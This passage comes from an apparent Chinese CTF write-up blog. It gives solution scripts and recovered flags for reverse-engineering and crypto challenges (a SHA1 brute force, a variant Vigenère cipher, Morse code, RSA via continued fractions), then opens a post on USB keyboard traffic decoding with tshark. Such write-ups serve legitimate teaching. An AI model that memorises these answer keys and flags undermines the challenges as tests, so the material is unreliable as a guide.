class="hljs-number">20</span>] = <span class="hljs-number">0x195E97F9</span>;<br>    *(_DWORD *)&amp;v29[<span class="hljs-number">24</span>] = <span class="hljs-number">0x9915C29D</span>;<br>    *(_DWORD *)&amp;v29[<span class="hljs-number">28</span>] = <span class="hljs-number">0xCC9F7D70</span>;<br>    __asm<br>    &#123;<br>        vpcmpeqb ymm0, ymm0, ymmword ptr [ebp<span class="hljs-number">-20</span>h]<br>            vmovdqu ymmword ptr [ebp<span class="hljs-number">-20</span>h], ymm0<br>            vzeroupper<br>        &#125;<br>    <span class="hljs-keyword">while</span> ( *(_DWORD *)v7 == *(_DWORD *)v8 )<br>    &#123;<br>        v7 += <span class="hljs-number">4</span>;<br>        v8 += <span class="hljs-number">4</span>;<br>        v14 = v9 &lt; <span class="hljs-number">4</span>;<br>        v9 -= <span class="hljs-number">4</span>;<br>        <span class="hljs-keyword">if</span> ( v14 )<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>手动识别sha1,然后有个xor,乱序,提取反过来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python">msg = [<span class="hljs-number">0xCD</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x92</span>,<br>       <span class="hljs-number">0x3C</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x7D</span>,<br>       <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xE2</span>,<br>       <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x32</span>]<br>index_ = [<span class="hljs-number">0x0A</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x09</span>,<br>          <span class="hljs-number">0x00</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x1F</span>,<br>          <span class="hljs-number">0x14</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x10</span>,<br>          <span class="hljs-number">0x19</span>, <span class="hljs-number">0x1A</span>]<br>des = [<span class="hljs-number">0x5F</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x3C</span>,<br>       <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x15</span>,<br>       <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x7D</span>,<br>       <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xCC</span>]<br>des2 = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    des2.append(des[index_[i]])<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> des2:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:].upper(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br>des3 = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    des3.append(des[index_.index(i)])<br><br><span class="hljs-built_in">print</span>()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> des3:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:].upper(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-built_in">print</span>()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    des3[i] ^= msg[i]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> des3:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:].upper(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">4F92B0DA99F4E876913C5FD04E12B117999D19CCF99F115977D5E70352AC215</span><br><span class="hljs-string">4FB14EB017F49991DA3C5FD01292E8767D705E19F99D151359FCC2A99C29715</span><br><span class="hljs-string">825A10C618D636A058AE633FAA539E70655FEB648697FF84A79F4589B5207027</span><br><span class="hljs-string"> &#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>运行程序，输入字符串就可以拿到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">Input your code: 825A10C618D636A058AE633FAA539E70655FEB648697FF84A79F4589B5207027<br>Your Flag is: flagfISEC-a49d6b847bdba62c5bfa0a43b69c85753<br></code></pre></td></tr></table></figure><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Crypto2"><a href="#Crypto2" class="headerlink" title="Crypto2"></a>Crypto2</h4><p>爆破sha1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> string<br><br>sha1 = <span class="hljs-string">&quot;8c36e4?c1d294?df5bb7a9b?b8bd2d2?f22c1f?9&quot;</span><br>dic = string.printable<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> dic:<br>            <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> dic:<br>                pw = <span class="hljs-string">f&#x27;i<span class="hljs-subst">&#123;i&#125;</span>Bgt<span class="hljs-subst">&#123;j&#125;</span>_Ld<span class="hljs-subst">&#123;k&#125;</span>s<span class="hljs-subst">&#123;l&#125;</span>6c9&#x27;</span><br>                sha11 = hashlib.sha1(pw.encode()).hexdigest()<br>                <span class="hljs-keyword">if</span> sha11[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == sha1[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>]:<br>                    <span class="hljs-built_in">print</span>(pw, sha11)<br>                  <br><span class="hljs-comment"># idBgtV_Ld&#123;sE6c9 8c36e414229315b89bfb39279fb2591cf474a188</span><br><span class="hljs-comment"># ifBgtd_LdTs+6c9 8c36e41f5c5c73579aec0cfb5bd99436606768f1</span><br><span class="hljs-comment"># ihBgtc_LdUs&#123;6c9 8c36e46ea808b38b56c3a676c296226219243353</span><br><span class="hljs-comment"># ikBgtm_Ld*s46c9 8c36e4a43c55291fd0273356c7259c9fc99fc167</span><br><span class="hljs-comment"># ilBgt0_Ldzsp6c9 8c36e4eea79d01bdb59b9f15323e652a278eceb0</span><br><span class="hljs-comment"># ipBgt&lt;_Ld)sa6c9 8c36e4a7ca1e295fb174fe8b215d126a944d4f4d</span><br><span class="hljs-comment"># iZBgtZ_Ldqs;6c9 8c36e471073904d2ba3e3a66c80899893dbbe27d</span><br><span class="hljs-comment"># i&#123;Bgt)_Ldxs56c9 8c36e4637aad2cc5b043fa277efcefe3f35f280d</span><br><span class="hljs-comment"># i&#125;Bgt,_Ld9s96c9 8c36e4c30ba623f0c7c1bcdf6e9073cddb462cc6</span><br><span class="hljs-comment"># i~Bgto_Ldes     6c9 8c36e463691b8d473455e2914ff623f6e962c7ed</span><br><span class="hljs-comment"># i~BgtN_Ld@sw6c9 8c36e45c1d2949df5bb7a9bfb8bd2d24f22c1f49</span><br></code></pre></td></tr></table></figure><p>压缩包爆破得到第二层密码ROT47</p><p>结合密码对密码解ROT47得到密文</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fsharp"><span class="hljs-number">6</span>JnsNxHKJ8mkvhS&#123;<span class="hljs-keyword">rMO_c9apMfHDHObq80PMu</span>&#123;<span class="hljs-keyword">_ww_r</span>&#123;rq<br></code></pre></td></tr></table></figure><p>变表vigenere，参考<a href="https://github.com/p4-team/ctf/tree/master/2017-12-09-seccon-quals/crypto_vigenere">ctf/2017-12-09-seccon-quals/crypto_vigenere at master · p4-team/ctf</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_l</span>(<span class="hljs-params">idx, s</span>):<br>    <span class="hljs-keyword">return</span> s[idx:] + s[:idx]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">p, k1, k2</span>):<br>    s = <span class="hljs-string">&quot;abcd07efghij89klmnopqr16stuvwxyz-_&#123;&#125;ABCDEFGHIJKL34MNOPQRST25VWXYZ&quot;</span><br>    t = [[_l((i+j) % <span class="hljs-built_in">len</span>(s), s) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s))] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s))]<br>    i1 = <span class="hljs-number">0</span><br>    i2 = <span class="hljs-number">0</span><br>    c = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> p:<br>        c += t[s.find(a)][s.find(k1[i1])][s.find(k2[i2])]<br>        i1 = (i1 + <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(k1)<br>        i2 = (i2 + <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(k2)<br>    <span class="hljs-keyword">return</span> c<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">ct, k1, k2</span>):<br>    s = <span class="hljs-string">&quot;abcd07efghij89klmnopqr16stuvwxyz-_&#123;&#125;ABCDEFGHIJKL34MNOPQRST25VWXYZ&quot;</span><br>    t = [[_l((i + j) % <span class="hljs-built_in">len</span>(s), s) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s))] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s))]<br>    i1 = <span class="hljs-number">0</span><br>    i2 = <span class="hljs-number">0</span><br>    decrypted = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> ct:<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>            <span class="hljs-keyword">if</span> t[s.find(c)][s.find(k1[i1])][s.find(k2[i2])] == a:<br>                decrypted += c<br>                <span class="hljs-keyword">break</span><br>        i1 = (i1 + <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(k1)<br>        i2 = (i2 + <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(k2)<br>    <span class="hljs-keyword">return</span> decrypted<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recover_key</span>(<span class="hljs-params">known_prefix, ciphertex</span>):<br>    final_key = [<span class="hljs-string">&#x27;*&#x27;</span>] * <span class="hljs-number">20</span><br>    s = <span class="hljs-string">&quot;abcd07efghij89klmnopqr16stuvwxyz-_&#123;&#125;ABCDEFGHIJKL34MNOPQRST25VWXYZ&quot;</span><br>    <span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>            partial_candidate_key = [<span class="hljs-string">&#x27;*&#x27;</span>] * <span class="hljs-number">20</span> <span class="hljs-comment"># 为2的倍数，多次尝试20得到key</span><br>            partial_candidate_key[pos] = c<br>            partial_candidate_key[<span class="hljs-number">19</span> - pos] = c<br>            key = <span class="hljs-string">&quot;&quot;</span>.join(partial_candidate_key)<br>            res = encrypt(known_prefix, key, key[::-<span class="hljs-number">1</span>])<br>            <span class="hljs-keyword">if</span> res[pos] == ciphertex[pos]:<br>                final_key[pos] = c<br>                final_key[<span class="hljs-number">19</span> - pos] = c<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(final_key))<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(final_key)<br><br>known = <span class="hljs-string">&#x27;flag&#123;ISEC-&#x27;</span><br>cipher = <span class="hljs-string">&#x27;6JnsNxHKJ8mkvhS&#123;rMO_c9apMfHDHObq80PMu&#123;_ww_r&#123;rq&#x27;</span><br>key = <span class="hljs-string">&quot;glFgFtudARRAdutFgFlg&quot;</span><br><br><span class="hljs-built_in">print</span>(recover_key(known,cipher))<br><span class="hljs-built_in">print</span>(decrypt(cipher,key[::-<span class="hljs-number">1</span>],key))<br></code></pre></td></tr></table></figure><h4 id="Crypto1"><a href="#Crypto1" class="headerlink" title="Crypto1"></a>Crypto1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">--/---/.-./..././..--.-/-.-./---/-.././..--.-/..-./..-/-./-./-.--<br>解摩斯转小写<br>morse_code_funny<br></code></pre></td></tr></table></figure><p>连分数展开得到num1和num2，然后常规解rsa</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># sage</span><br><br>data3 = <span class="hljs-number">1.23389923415003373900567515471436168841941584796842188964423737295914869304653496800649965063081353720701415762591488370228399019899893688681309320356016722276295236528757306976510687729729934668311830828756908988350841843676900575414367123810470585198055372776278588638204471298838884740198056387082949710435502826460830711429956</span><br><br>c = continued_fraction(data3)<br><br>alist = c.convergents()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> alist:<br>    a = <span class="hljs-built_in">str</span>(i).split(<span class="hljs-string">&#x27;/&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a)&gt;<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> gcd(<span class="hljs-built_in">int</span>(a[<span class="hljs-number">0</span>]),<span class="hljs-built_in">int</span>(a[<span class="hljs-number">1</span>])) == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> is_prime(<span class="hljs-built_in">int</span>(a[<span class="hljs-number">0</span>])) <span class="hljs-keyword">and</span> is_prime(<span class="hljs-built_in">int</span>(a[<span class="hljs-number">1</span>])) <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(a[<span class="hljs-number">0</span>]).bit_length()==<span class="hljs-number">512</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(a[<span class="hljs-number">1</span>]).bit_length()==<span class="hljs-number">512</span>:<br>        <span class="hljs-built_in">print</span>(a)<br><br><span class="hljs-comment"># [&#x27;11167377337790397338811417806698264734026040696284907854286100186126887838302430726803014418419121360514985339992064951270502853852777225947659429837569693&#x27;, &#x27;9050477566333038464101590216458863799039754468566791821195736389139213194857548339787600682491327798736538059818887575696704421576721592454156775006222517&#x27;]</span><br><br>n12=[<span class="hljs-number">11167377337790397338811417806698264734026040696284907854286100186126887838302430726803014418419121360514985339992064951270502853852777225947659429837569693</span>, <span class="hljs-number">9050477566333038464101590216458863799039754468566791821195736389139213194857548339787600682491327798736538059818887575696704421576721592454156775006222517</span>]<br><br>leak = <span class="hljs-number">23213363443983005040318061737977092634638640953366787443691593387275645092922646169818923792205696350020369122807136306157118385984272980615310163206933078119776935167207473544453080959202803743994251355133953187110546017667004996272367137522351606700447920805532616096125523674597551449412004735397779511371</span><br><br>PHI = (n12[<span class="hljs-number">0</span>]-<span class="hljs-number">1</span>)*(n12[<span class="hljs-number">1</span>]-<span class="hljs-number">1</span>)<br>p_qd = <span class="hljs-built_in">pow</span>(n12[<span class="hljs-number">0</span>],-<span class="hljs-number">1</span>,PHI)<br>p_q = <span class="hljs-built_in">pow</span>(leak,p_qd,n12[<span class="hljs-number">0</span>]*n12[<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(p_q)<br><br>var(<span class="hljs-string">&quot;p,q&quot;</span>)<br><br>ct = <span class="hljs-number">31011170589632318837149853165664224847925206003567781692767655474759523146503572164952138829336342836023903919700264739071138739105931471740973631326608186969523753119546323993892359278563753903149741128282349467136720827132122619177620866305659196267641453819504766216964516467658995724859657544518337771393</span><br>N = <span class="hljs-number">61860727516406742636690805639158184396057779906729165734489212939937929906456706343476469874085504076991779041906401043694401076841639925611957258119417559980829238154105119701407722069260962772947894516879731956778127512764229384957918619863998939985369399189275568362193066167855420897196095587732512368673</span><br><br>res = solve([N-p*q,p-q-p_q],[p,q],solution_dict=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(res)<br><br><span class="hljs-built_in">print</span>(res[<span class="hljs-number">0</span>][p])<br><span class="hljs-built_in">print</span>(res[<span class="hljs-number">0</span>][q])<br>p = res[<span class="hljs-number">0</span>][p]<br>q = res[<span class="hljs-number">0</span>][q]<br><br>d = <span class="hljs-built_in">pow</span>(<span class="hljs-number">65537</span>,-<span class="hljs-number">1</span>,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(ct,d,N)<br>mm = m - n12[<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(mm)[<span class="hljs-number">2</span>:]))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>一些USB流量分析</title>
    <link href="/2023/09/23/USB%E6%B5%81%E9%87%8F/"/>
    <url>/2023/09/23/USB%E6%B5%81%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<p>这里记一下碰到的一些USB的流量分析）</p><h2 id="2023-“华为杯”第二届中国研究生网络安全创新大赛"><a href="#2023-“华为杯”第二届中国研究生网络安全创新大赛" class="headerlink" title="2023 “华为杯”第二届中国研究生网络安全创新大赛"></a>2023 “华为杯”第二届中国研究生网络安全创新大赛</h2><h3 id="port"><a href="#port" class="headerlink" title="port"></a>port</h3><p>对usb.pcpang常规键盘分析一条龙</p><p><code>tshark -r usb.pcapng -T fields -e usbhid.data | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>fi=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>   a=f.readline().strip()<br>   <span class="hljs-keyword">if</span> a:<br>       <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a)== <span class="hljs-number">16</span>: <span class="hljs-comment"># 鼠标流量的话 len 改为 8</span><br>          out=<span class="hljs-string">&#x27;&#x27;</span><br>          <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>              <span class="hljs-keyword">if</span> i+<span class="hljs-number">2</span> != <span class="hljs-built_in">len</span>(a):<br>                  out+=a[i]+a[i+<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;:&quot;</span><br>              <span class="hljs-keyword">else</span>:<br>                 out+=a[i]+a[i+<span class="hljs-number">1</span>]<br>          fi.write(out)<br>          fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>   <span class="hljs-keyword">else</span>:<br>       <span class="hljs-keyword">break</span><br>fi.close()<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python">normalKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>: <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>: <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>: <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>: <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>: <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>: <span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>: <span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>: <span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>: <span class="hljs-string">&quot;i&quot;</span>,<br>              <span class="hljs-string">&quot;0d&quot;</span>: <span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>: <span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>: <span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>: <span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>: <span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>: <span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>: <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>: <span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>: <span class="hljs-string">&quot;r&quot;</span>,<br>              <span class="hljs-string">&quot;16&quot;</span>: <span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>: <span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>: <span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>: <span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>: <span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>: <span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>: <span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>: <span class="hljs-string">&quot;z&quot;</span>, <span class="hljs-string">&quot;1e&quot;</span>: <span 